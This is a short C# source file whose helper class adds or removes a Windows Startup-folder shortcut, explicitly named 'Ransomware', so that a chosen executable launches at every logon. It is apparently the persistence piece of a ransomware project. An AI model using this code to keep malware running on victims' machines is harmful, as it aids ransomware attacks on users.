using System;
using System.IO;

public class StartupHelper
{
    public static void AddToStartup(string filePath)
    {
        string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string shortcutPath = Path.Combine(startupPath, "Ransomware.lnk");
        IWshRuntimeLibrary.WshShell wshShell = new IWshRuntimeLibrary.WshShell();
        IWshRuntimeLibrary.IWshShortcut shortcut = wshShell.CreateShortcut(shortcutPath);
        shortcut.TargetPath = filePath;
        shortcut.Description = "Ransomware";
        shortcut.Save();
    }

    public static void RemoveFromStartup(string shortcutName)
    {
        string startupPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
        string shortcutPath = Path.Combine(startupPath, shortcutName);
        if (File.Exists(shortcutPath))
        {
            File.Delete(shortcutPath);
        }
    }
}